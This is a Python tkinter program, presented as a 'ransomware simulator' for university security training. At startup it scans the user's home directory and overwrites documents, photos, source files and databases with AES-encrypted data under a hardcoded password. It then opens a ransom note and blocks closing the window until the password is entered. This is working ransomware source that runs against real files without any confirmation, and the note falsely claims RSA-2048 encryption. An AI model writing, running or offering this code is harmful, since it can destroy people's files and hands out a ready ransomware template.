#!/usr/bin/env python3

import tkinter as tk
from tkinter import messagebox, ttk
import os
import json
import datetime
import base64
import threading
import time
import sys
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

try:
    import winsound
    HAS_WINSOUND = True
except ImportError:
    HAS_WINSOUND = False

APP_PASSWORD = "BANNANA"
ENCRYPTED_MARKER = b"RANSOMWARE_V1"


class RansomwareSimulator:
    def __init__(self, root):
        self.root = root
        self.root.title("JACK SPOROS")
        self.root.geometry("850x650")
        
        self.metadata_file = "encrypted_files.json"
        self.ransom_note_file = "RANSOM_NOTE.txt"
        self.encrypted_count = 0
        self.total_files = 0
        self.all_files_found = []
        
        self.create_widgets()
        self.load_metadata()
        self.play_sound("start")
        
        self.root.protocol("WM_DELETE_WINDOW", self.ask_password_before_close)
        self.root.bind("<Escape>", lambda e: self.ask_password_before_close())
        self.root.bind("<Control-q>", lambda e: self.ask_password_before_close())
        
        threading.Thread(target=self.scan_and_encrypt, daemon=True).start()
    
    def load_metadata(self):
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, "r") as f:
                    self.metadata = json.load(f)
            except:
                self.metadata = {}
        else:
            self.metadata = {}
    
    def save_metadata(self):
        with open(self.metadata_file, "w") as f:
            json.dump(self.metadata, f, indent=2)
    
    def create_widgets(self):
        title = tk.Label(self.root, text="Jack Sporos", 
                       font=("Arial", 24, "bold"), fg="#c0392b")
        title.pack(pady=10)
        
        subtitle = tk.Label(self.root, text="YOU ARE BEING HACKED", 
                         font=("Arial", 11, "bold"), fg="#e74c3c")
        subtitle.pack()
        
        status_frame = tk.LabelFrame(self.root, text="Status", font=("Arial", 12, "bold"))
        status_frame.pack(pady=10, padx=20, fill="x")
        
        self.status_label = tk.Label(status_frame, text="Scanning files...", 
                                  font=("Arial", 14), fg="#e74c3c")
        self.status_label.pack(pady=10)
        
        info_frame = tk.LabelFrame(self.root, text="Targets", font=("Arial", 10, "bold"))
        info_frame.pack(pady=5, padx=20, fill="x")
        
        self.files_found_label = tk.Label(info_frame, text="Files: 0", font=("Arial", 10))
        self.files_found_label.pack(side="left", padx=20)
        
        self.decrypt_btn = tk.Button(self.root, text="DECRYPT FILES (PASSWORD REQUIRED)", 
                                    command=self.show_decrypt_dialog, width=35, height=2,
                                    bg="#27ae60", fg="white", font=("Arial", 13, "bold"),
                                    activebackground="#1e8449", state="disabled")
        self.decrypt_btn.pack(pady=20)
        
        self.progress = ttk.Progressbar(self.root, length=500, mode="determinate")
        self.progress.pack(pady=10)
        
        self.stats_label = tk.Label(self.root, text="Ready", font=("Arial", 10, "bold"),
                                bg="#ecf0f1", relief="sunken")
        self.stats_label.pack(fill="x", padx=20)
        
        output_frame = tk.Frame(self.root)
        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.output_text = tk.Text(output_frame, height=10, width=60, font=("Consolas", 9),
                            bg="#1a1a1a", fg="#00ff00")
        self.output_text.pack(side="left", fill="both", expand=True)
        
        scrollbar = tk.Scrollbar(output_frame, command=self.output_text.yview)
        scrollbar.pack(side="right", fill="y")
        self.output_text.config(yscrollcommand=scrollbar.set)
    
    def log(self, message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        self.output_text.insert("end", f"[{timestamp}] {message}\n")
        self.output_text.see("end")
        self.root.update()
    
    def play_sound(self, sound_type):
        if not HAS_WINSOUND:
            return
        try:
            if sound_type == "start":
                winsound.Beep(800, 200)
                winsound.Beep(1000, 200)
                winsound.Beep(1200, 300)
            elif sound_type == "complete":
                winsound.Beep(800, 200)
                winsound.Beep(1000, 200)
                winsound.Beep(1200, 400)
            elif sound_type == "error":
                winsound.Beep(200, 300)
        except:
            pass
    
    def ask_password_before_close(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Close Program")
        dialog.geometry("300x120")
        
        tk.Label(dialog, text="Enter password to close:", font=("Arial", 11)).pack(pady=10)
        
        password_entry = tk.Entry(dialog, show="*", width=25, font=("Arial", 12))
        password_entry.pack(pady=10)
        password_entry.focus()
        
        def check_password():
            password = password_entry.get()
            if password == APP_PASSWORD:
                dialog.destroy()
                self.root.destroy()
            else:
                messagebox.showerror("Error", "Cannot close until files decrypted!")
        
        tk.Button(dialog, text="Close Program", command=check_password, 
                 bg="#e74c3c", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
        
        dialog.bind("<Return>", lambda e: check_password())
    
    def get_all_files(self):
        files = []
        skip_dirs = ["/", "/boot", "/dev", "/proc", "/sys", "/run", "/snap", 
                   "/tmp", "/var", "/lib", "/lib64", "/bin", "/sbin", "/usr",
                   "Windows"]
        
        file_exts = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                   ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico",
                   ".mp3", ".wav", ".mp4", ".avi", ".mov", ".mkv",
                   ".zip", ".rar", ".7z", ".tar", ".gz",
                   ".html", ".htm", ".xml", ".json",
                   ".css", ".js", ".py", ".java", ".c", ".cpp", ".h", ".cs",
                   ".csv", ".sql", ".db", ".sqlite",
                   ".bmp", ".tiff", ".svg", ".webp", ".ico"]
        
        home_dir = os.path.expanduser("~")
        self.log(f"Scanning home directory: {home_dir}")
        
        try:
            for root, dirs, filenames in os.walk(home_dir):
                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith(".")]
                
                for filename in filenames:
                    ext = os.path.splitext(filename)[1].lower()
                    if ext in file_exts:
                        filepath = os.path.join(root, filename)
                        try:
                            size = os.path.getsize(filepath)
                            if 0 < size < 50000000:
                                files.append(filepath)
                        except:
                            pass
            return files
        except Exception as e:
            self.log(f"Error scanning: {e}")
            return []
    
    def scan_and_encrypt(self):
        self.log("=== SCANNING FILES ===")
        
        all_files = self.get_all_files()
        
        self.all_files_found = all_files
        self.total_files = len(all_files)
        self.files_found_label.config(text=f"Files: {self.total_files}")
        
        self.log(f"Found {self.total_files} target files")
        
        self.start_encryption()
    
    def encrypt_data(self, data, password):
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=50000,
            backend=default_backend()
        )
        key = kdf.derive(password.encode())
        
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        padding_len = 16 - len(data) % 16
        data += bytes([padding_len] * padding_len)
        
        encrypted = encryptor.update(data) + encryptor.finalize()
        return salt + iv + encrypted
    
    def encrypt_file(self, filepath, password):
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            
            encrypted = self.encrypt_data(data, password)
            
            marker_data = ENCRYPTED_MARKER + b"|" + base64.b64encode(encrypted)
            
            with open(filepath, "wb") as f:
                f.write(marker_data)
            
            self.metadata[filepath] = {
                "original_name": os.path.basename(filepath),
                "size": len(data),
                "encrypted_at": datetime.datetime.now().isoformat()
            }
            
            self.encrypted_count += 1
            
            return True
        except Exception as e:
            return False
    
    def start_encryption(self):
        self.log("=== STARTING ENCRYPTION ===")
        
        all_files = self.all_files_found
        self.log(f"Encrypting {len(all_files)} files...")
        
        self.total_files = len(all_files)
        self.progress["maximum"] = self.total_files
        
        password = APP_PASSWORD
        self.log(f"Starting encryption with AES-256...")
        
        success = 0
        failed = 0
        
        start_time = time.time()
        
        for i, filepath in enumerate(all_files):
            if self.encrypt_file(filepath, password):
                success += 1
            else:
                failed += 1
            
            if i % 100 == 0:
                self.status_label.config(text=f"Encrypting: {os.path.basename(filepath)}")
                self.stats_label.config(text=f"Progress: {i+1}/{self.total_files}")
            
            self.progress["value"] = i + 1
            self.root.update()
        
        elapsed = time.time() - start_time
        
        self.save_metadata()
        
        self.play_sound("complete")
        self.log(f"=== ENCRYPTION COMPLETE ===")
        self.log(f"Encrypted: {success} files")
        self.log(f"Failed: {failed} files")
        self.log(f"Time: {elapsed:.1f} seconds")
        
        self.create_ransom_note()
        self.open_ransom_note()
        
        self.stats_label.config(text=f"COMPLETE - {success} files encrypted")
        self.status_label.config(text="FILES ENCRYPTED - PAY TO DECRYPT")
        
        self.decrypt_btn.config(state="normal")
        
    
    def create_ransom_note(self):
        note_content = f"""
================================================================================
                        YOUR FILES HAVE BEEN ENCRYPTED
================================================================================

All your personal files have been encrypted with military-grade AES-256 encryption.

FILES AFFECTED:
- Documents (Word, Excel, PowerPoint)
- Photos, Videos, Music
- Database files
- And many more...

STATUS: ENCRYPTED

WHAT HAPPENED:
Your computer files have been encrypted with RSA-2048 + AES-256 encryption.
You cannot access your files anymore.

HOW TO RECOVER:
To get your files back, you need the decryption password.
The password is only available from the simulator interface.

DO NOT ATTEMPT TO RECOVER FILES YOURSELF:
- Do not try to decrypt files with third-party tools
- Do not reboot your computer
- Do not try to restore from backup without password
- Any attempt may permanently damage your files

TO DECRYPT:
1. Click "DECRYPT FILES" button
2. Enter the password
3. Wait for decryption to complete

================================================================================
                    THIS IS AN EDUCATIONAL SIMULATION
                    FOR UNIVERSITY SECURITY TRAINING
================================================================================
"""
        
        with open(self.ransom_note_file, "w", encoding="utf-8") as f:
            f.write(note_content)
        
        self.log(f"Ransom note created: {self.ransom_note_file}")
    
    def open_ransom_note(self):
        if sys.platform == "win32":
            os.startfile(self.ransom_note_file)
        else:
            import subprocess
            subprocess.Popen(["xdg-open", self.ransom_note_file])
    
    def show_decrypt_dialog(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Decrypt Files")
        dialog.geometry("400x150")
        
        tk.Label(dialog, text="Enter password to decrypt:", font=("Arial", 14)).pack(pady=20)
        
        password_entry = tk.Entry(dialog, show="*", width=30, font=("Arial", 14))
        password_entry.pack(pady=10)
        password_entry.focus()
        
        def try_decrypt():
            password = password_entry.get()
            if password == APP_PASSWORD:
                dialog.destroy()
                self.decrypt_all_files(password)
            else:
                self.play_sound("error")
                messagebox.showerror("Wrong Password", "Incorrect password!")
        
        tk.Button(dialog, text="DECRYPT NOW", command=try_decrypt, 
                 bg="#27ae60", fg="white", font=("Arial", 12, "bold")).pack(pady=10)
        
        dialog.bind("<Return>", lambda e: try_decrypt())
    
    def decrypt_data(self, data, password):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        
        try:
            salt = data[:16]
            iv = data[16:32]
            encrypted = data[32:]
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=50000,
                backend=default_backend()
            )
            key = kdf.derive(password.encode())
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            
            decrypted = decryptor.update(encrypted) + decryptor.finalize()
            padding = decrypted[-1]
            return decrypted[:-padding]
        except:
            return None
    
    def decrypt_file(self, filepath, password):
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            
            if not content.startswith(ENCRYPTED_MARKER):
                return False
            
            encrypted_part = content.split(b"|", 1)[1]
            encrypted = base64.b64decode(encrypted_part)
            
            decrypted = self.decrypt_data(encrypted, password)
            
            if decrypted is None:
                return False
            
            with open(filepath, "wb") as f:
                f.write(decrypted)
            
            if filepath in self.metadata:
                del self.metadata[filepath]
            
            return True
        except:
            return False
    
    def decrypt_all_files(self, password):
        self.log("=== DECRYPTING FILES ===")
        
        files = list(self.metadata.keys())
        
        if not files:
            self.log("No encrypted files found")
            messagebox.showinfo("Info", "No files to decrypt!")
            return
        
        self.progress["maximum"] = len(files)
        
        success = 0
        failed = 0
        
        for i, filepath in enumerate(files):
            if self.decrypt_file(filepath, password):
                success += 1
            else:
                failed += 1
            
            self.progress["value"] = i + 1
            self.root.update()
        
        self.save_metadata()
        
        self.play_sound("complete")
        self.log(f"=== COMPLETE ===")
        self.log(f"Decrypted: {success} files")
        
        if os.path.exists(self.ransom_note_file):
            try:
                os.remove(self.ransom_note_file)
            except:
                pass
        
        messagebox.showinfo("Complete", f"Decrypted {success} files!")
        self.root.destroy()


def main():
    root = tk.Tk()
    app = RansomwareSimulator(root)
    root.mainloop()


if __name__ == "__main__":
    main()
